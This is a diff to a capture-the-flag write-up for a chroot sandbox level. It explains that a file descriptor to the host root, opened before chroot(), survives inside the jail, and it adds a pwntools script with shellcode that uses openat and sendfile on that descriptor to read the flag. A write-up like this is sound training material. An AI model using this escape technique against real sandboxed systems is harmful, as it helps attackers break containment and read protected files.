@@ -56,7 +56,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
@@ -68,11 +68,63 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-== Chdir("/") after chroot
+== Vulnerability Analysis
 
-Level 3 correctly calls `chdir("/")` after `chroot()`, ensuring that the current working directory is moved inside the jail. However, the vulnerability from Level 2 persists: a file descriptor opened before the jail was initialized remains accessible to the shellcode.
+This level attempts to fix the previous issue by correctly calling `chdir("/")` after `chroot()`. This ensures that the process's current working directory is moved inside the jail, preventing relative path escapes like `../../`.
 
-Even though we are now inside the jail and our CWD is at the jail's root, we still have a handle (FD 3) to the real root directory outside.
+However, the vulnerability from the previous level persists: the program still opens a user-controlled file (`argv[1]`) *before* the sandbox is initialized.
 
-*Exploit:*
-The strategy is identical to Level 2. We provide `/` as the first argument and use `openat(3, "flag", ...)` in our shellcode to reach the real flag.
+```c
+int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+// ...
+assert(chroot(jail_path) == 0);
+assert(chdir("/") == 0);
+```
+
+Even though our CWD is now safely inside the jail, the file descriptor (FD 3) pointing to the real root (if we pass `/`) remains valid and accessible.
+
+== Exploitation Plan
+
+1.  **Leak the Root FD:** Run the binary with `/` as the argument to open the host's root directory.
+2.  **Bypass Sandbox:** Use the `openat` syscall with the leaked file descriptor (FD 3) as the directory base. This allows us to access files relative to the host's root, completely ignoring the current `chroot` and `chdir` state.
+3.  **Retrieve Flag:** Open the `flag` file using `openat` and send its content to stdout.
+
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+# Pass '/' to open the real root directory
+p = process([exe, "/"])
+
+shellcode = asm("""
+    /* openat(3, "flag", O_RDONLY) */
+    mov rdi, 3              /* dirfd: 3 */
+    lea rsi, [rip + flag]   /* pathname: "flag" */
+    xor rdx, rdx            /* flags: O_RDONLY */
+    mov rax, 257            /* syscall: SYS_openat */
+    syscall
+
+    /* sendfile(1, fd, 0, 100) */
+    mov rsi, rax            /* in_fd */
+    mov rdi, 1              /* out_fd */
+    xor rdx, rdx            /* offset */
+    mov r10, 100            /* count */
+    mov rax, 40             /* syscall: SYS_sendfile */
+    syscall
+
+    /* exit(0) */
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+flag:
+    .string "flag"
+""")
+
+p.send(shellcode)
+p.interactive()
+```
